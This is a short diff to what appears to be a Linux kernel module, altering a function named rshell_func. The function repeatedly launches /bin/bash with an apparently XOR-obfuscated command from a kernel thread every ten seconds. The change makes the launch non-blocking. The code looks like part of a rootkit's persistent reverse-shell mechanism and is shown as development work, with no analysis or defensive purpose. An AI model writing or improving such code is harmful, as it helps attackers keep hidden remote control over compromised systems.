@@ -15,7 +15,7 @@ int rshell_func(void* data) {
     char* argv[] = { "/bin/bash", "-c", xor_cmd, NULL };
     static char* envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
         while (!kthread_should_stop()) {
-            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+            call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
             ssleep(10);
         }
     return 0;
